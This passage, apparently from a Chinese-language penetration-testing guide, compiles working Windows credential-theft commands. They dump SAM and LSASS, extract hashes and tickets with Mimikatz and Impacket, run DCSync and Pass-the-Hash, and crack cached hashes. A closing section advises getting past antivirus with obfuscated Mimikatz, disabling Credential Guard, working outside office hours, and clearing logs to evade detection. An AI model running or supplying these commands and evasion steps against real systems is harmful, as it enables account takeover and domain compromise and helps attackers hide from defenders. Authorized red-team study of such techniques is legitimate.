## 六、代码汇总

### 6.1 SAM 数据库提取

```powershell
# 方法 1: 使用 reg save (需要 SYSTEM 权限)
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save

# 方法 2: 使用 Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# 方法 3: 使用 PowerShell (需要 SYSTEM 权限)
[System.IO.File]::Copy("C:\Windows\System32\config\SAM", "C:\temp\sam", $true)
```

### 6.2 解析 SAM 数据库

```bash
# 使用 secretsdump.py (Impacket)
impacket-secretsdump -sam sam.save -system system.save LOCAL

# 使用 samdump2
samdump2 system.save sam.save

# 使用 Mimikatz
mimikatz # lsadump::sam /sam:sam.save /system:system.save
```

### 6.3 LSASS 内存转储

```powershell
# 方法 1: 使用 procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 方法 2: 使用 comsvcs.dll
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full

# 方法 3: 使用 Task Manager
# 右键 lsass.exe -> Create dump file

# 方法 4: 使用 PowerShell
$process = Get-Process lsass
$path = "C:\temp\lsass.dmp"
[System.Diagnostics.Process]::Start("procdump.exe", "-accepteula -ma $($process.Id) $path")
```

### 6.4 Mimikatz 凭据提取

```
# 提升权限
mimikatz # privilege::debug

# 从 LSASS 提取凭据
mimikatz # sekurlsa::logonpasswords

# 提取 Kerberos 票据
mimikatz # sekurlsa::tickets /export

# 从 SAM 提取哈希
mimikatz # lsadump::sam

# 从 LSASS 转储文件提取
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 6.5 DCSync 攻击

```
# 使用 Mimikatz
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.com /all /csv

# 使用 secretsdump.py
secretsdump.py corp.com/admin:password@dc01.corp.com
secretsdump.py -just-dc corp.com/admin:password@dc01.corp.com
secretsdump.py -just-dc-ntlm corp.com/admin:password@dc01.corp.com
```

### 6.6 Pass-the-Hash

```powershell
# 使用 Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<NTLM_HASH> /run:cmd.exe

# 使用 Impacket
impacket-psexec -hashes :<NTLM_HASH> corp.com/Administrator@target

# 使用 CrackMapExec
crackmapexec smb target -u Administrator -H ntlmhash
```

### 6.7 缓存凭据提取

```
# 使用 Mimikatz
mimikatz # lsadump::cache

# 使用 secretsdump.py
impacket-secretsdump -system system.save -security security.save -cached LOCAL

# 破解 DCC2 哈希
hashcat -m 2100 dcc2_hashes.txt wordlist.txt
```

## 七、实战经验总结

### 7.1 凭据获取优先级

```
优先级排序:
1. LSASS 内存 (可能有明文密码)
2. SAM 数据库 (本地用户哈希)
3. 缓存凭据 (域用户 DCC2 哈希)
4. DCSync (需要高权限)
5. NTDS.dit (需要域控访问)
```

### 7.2 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| Mimikatz 被杀软拦截 | 签名检测 | 使用混淆版本或 PowerShell 版本 |
| 无法访问 LSASS | Credential Guard | 尝试其他方法或禁用 CG |
| DCSync 失败 | 权限不足 | 确认有复制权限 |
| 哈希无法破解 | 密码复杂 | 使用 Pass-the-Hash |

### 7.3 检测规避

```
规避建议:
1. 使用内存中的工具，避免文件落地
2. 使用合法工具 (如 procdump) 转储 LSASS
3. 在非工作时间执行
4. 清理日志和痕迹
5. 使用加密通道传输数据
```
